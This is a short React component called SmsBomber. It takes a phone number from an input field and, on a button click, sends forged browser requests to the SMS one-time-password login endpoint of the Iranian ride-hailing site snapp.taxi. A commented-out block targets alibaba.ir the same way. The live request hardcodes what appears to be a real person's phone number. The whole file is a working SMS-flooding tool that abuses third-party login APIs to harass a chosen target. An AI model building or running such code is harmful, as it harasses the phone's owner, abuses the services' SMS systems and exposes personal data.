import React, { useEffect, useState } from "react";

export default function SmsBomber() {
  const [value, setValue] = useState("");

  const smsHandler = () => {
    // fetch("https://ws.alibaba.ir/api/v3/account/mobile/otp", {
    //   headers: {
    //     "ab-channel":
    //       "WEB-NEW,PRODUCTION,CSR,www.alibaba.ir,N,Chrome,119.0.0.0,N,N,Windows",
    //     accept: "application/json, text/plain, */*",
    //     "accept-language": "en-US,en;q=0.9,fa;q=0.8",
    //     "cache-control": "no-cache",
    //     "content-type": "application/json",
    //     pragma: "no-cache",
    //     "sec-ch-ua":
    //       '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    //     "sec-ch-ua-mobile": "?0",
    //     "sec-ch-ua-platform": '"Windows"',
    //     "sec-fetch-dest": "empty",
    //     "sec-fetch-mode": "cors",
    //     "sec-fetch-site": "same-site",
    //     "tracing-device": "N,Chrome,119.0.0.0,N,N,Windows",
    //     "tracing-sessionid": "1701629397187",
    //   },
    //   referrer: "https://www.alibaba.ir/",
    //   referrerPolicy: "strict-origin-when-cross-origin",
    //   body: `{"phoneNumber":"${value}"}`,
    //   method: "POST",
    //   mode: "cors",
    //   credentials: "omit",
    // });

    fetch("https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", {
      headers: {
        accept: "*/*",
        "accept-language": "en-US,en;q=0.9,fa;q=0.8",
        "app-version": "pwa",
        "cache-control": "no-cache",
        "content-type": "application/json",
        locale: "fa-IR",
        pragma: "no-cache",
        "sec-ch-ua":
          '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-app-name": "passenger-pwa",
        "x-app-version": "17.7.0",
      },
      referrer:
        "https://app.snapp.taxi/login/?redirect_to=%2F%3Futm_source%3Dwebsite%2Cutm_medium%3Dwebapp-button%2Cutm_campaign%3Dbody",
      referrerPolicy: "strict-origin-when-cross-origin",
      body: '{"cellphone":"+989100952145","attestation":{"method":"skip","platform":"skip"},"extra_methods":[]}',
      method: "POST",
      mode: "cors",
      credentials: "include",
    });
  };

  return (
    <>
      <input type="text" onChange={(e) => setValue(e.target.value)} />
      <button onClick={() => smsHandler()}>شروع کار</button>
    </>
  );
}
